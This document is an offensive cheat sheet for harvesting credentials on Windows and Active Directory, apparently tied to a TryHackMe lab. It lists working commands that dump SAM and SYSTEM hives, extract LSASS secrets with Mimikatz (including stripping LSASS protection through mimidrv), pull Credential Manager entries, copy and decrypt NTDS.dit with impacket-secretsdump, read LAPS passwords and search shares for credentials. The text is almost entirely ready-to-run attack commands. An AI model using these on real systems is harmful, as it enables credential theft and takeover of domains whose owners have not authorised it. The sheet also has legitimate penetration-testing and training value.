### Check for password in Registry   
```
c:\Users\user> reg query HKLM /f password /t REG_SZ /s
OR
C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```

### Check for password in Powershell history
```
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Dump the SAM
1)With Metasploit:
```
meterpreter > getuid
meterpreter > hashdump
```
2)With Shadow copies:
```
ShadowCopy of C: wmic shadowcopy call create Volume='C:\'
List Shadowcopies: vssadmin list shadows
PS C:\Windows\system32> .\vssadmin.exe list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {2a596d7f-97be-4d15-a498-c8ed60a1b0df}
   Contained 1 shadow copies at creation time: 1/2/2023 12:05:09 PM
      Shadow Copy ID: {729db806-a27d-4559-b16e-b3305e9a3ec2}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```
Copy SAM from Shadowcopy volume: 
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
```
Copy SYSTEM From Shadowcopy volume for Decryption: 
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
```
Dump content with impacket-secredump:  
```
impacket-secretsdump -sam **sam_file** -system **system_file** LOCAL
```
3)With Registry Hives
Dump SAM Registry: `reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg`
Dump SYSTEM Registry: `reg save HKLM\system C:\users\Administrator\Desktop\system-reg`
Dump content with impacket-secredump:  `impacket-secretsdump -sam **sam_file** -system **system_file** LOCAL`


### Dump creds from LSASS.exe
```
Launch Mimikatz: C:\Tools\Mimikatz> mimikatz.exe
privilege::debug
Dump everithing from LSASS.exe: 
sekurlsa::logonpasswords
```

### Protected LSASS.exe (Bypass protection)
If the key RunAsPPL have value set to **1** in **HKEY_LOCAL_MACHINE\SYSTEM**\CurrentControlSet\Control\Lsa then LSASS protection is in place. 
It will give you error like this:
```
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```
Load **mimidrv.sys**(cd to Mimikatz folder): 
```
!+
```
Remove LSASS protection: 
```
!processprotect /process:lsass.exe /remove
```


### Dump credentials from CredManager
Get Script: https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
```
powershell -ex bypass
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials
```

//Dump credentials from CredManager(with Mimikatz)
```
c:\Tools\Mimikatz\mimikatz.exe
privilege::debug
sekurlsa::credman
```


### Dump NTDS Domain Controller DB
1)Local Dump(no cred)
```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
Decrypt with impacket: impacket-secretsdump -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```

2)Remote Dump(creds are needed)
```
impacket-secretsdump -just-dc THM.red/<AD_Admin_User>@10.10.235.69 
Note if we are interested to dump only the NTLM hashes, then we can use the -just-dc-ntlm
```


### Dump password from LAPS
1)Find who can read from LAPS: 
```
Find-AdmPwdExtendedRights -Identity *
```
2)Add yourself or impersonate to that group
3)Fetch Computer password: 
```
Get-AdmPwdPassword -ComputerName XXXXXX
```


### Credentials in shares
```
git clone https://github.com/SnaffCon/Snaffler.git
cd Snaffler
Snaffler.exe -s -d FQDN -o snaffler.log -v data somethingtosearch
```
**Example**: `Snaffler.exe -s -d domain.localhost -o snaffler.log -v data web.conf` (will search for all web.conf in the domain given)
